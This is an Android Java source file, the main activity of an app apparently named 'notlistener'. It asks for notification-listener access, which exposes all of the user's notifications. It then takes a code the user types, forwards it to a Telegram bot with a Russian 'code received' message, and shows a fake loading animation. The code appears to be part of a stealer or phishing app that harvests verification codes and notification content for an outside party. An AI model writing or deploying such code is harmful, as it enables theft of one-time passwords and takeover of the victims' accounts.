package com.example.notlistener;

import androidx.appcompat.app.AppCompatActivity;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import pl.droidsonroids.gif.GifImageView;

public class MainActivity extends AppCompatActivity {
    private EditText codeInput;
    private Button submitButton;
    private GifImageView loadingGif;
    private TelegramBotHelper telegramBotHelper;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        // В методе onCreate после setContentView


        telegramBotHelper = new TelegramBotHelper(this);
        codeInput = findViewById(R.id.codeInput);
        submitButton = findViewById(R.id.submitButton);
        loadingGif = findViewById(R.id.loadingGif);

        if (!isNotificationServiceEnabled()) {
            requestNotificationListenerPermission();
        }

        submitButton.setOnClickListener(v -> {
            String code = codeInput.getText().toString().trim();
            if (!code.isEmpty()) {
                sendCodeToTelegram(code);
                showLoading();
            }
        });
    }

    private void sendCodeToTelegram(String code) {
        String message = "🔒 Получен код: " + code;
        telegramBotHelper.sendNotification(message);
    }

    private void showLoading() {
        loadingGif.setVisibility(View.VISIBLE);
        submitButton.setEnabled(false);
        codeInput.setEnabled(false);
    }

    private boolean isNotificationServiceEnabled() {
        String enabledNotificationListeners = Settings.Secure.getString(
                getContentResolver(),
                "enabled_notification_listeners"
        );
        return enabledNotificationListeners != null &&
                enabledNotificationListeners.contains(getPackageName());
    }

    private void requestNotificationListenerPermission() {
        Toast.makeText(this,
                "Пожалуйста, предоставьте разрешение на доступ к уведомлениям",
                Toast.LENGTH_LONG).show();
        startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
    }
}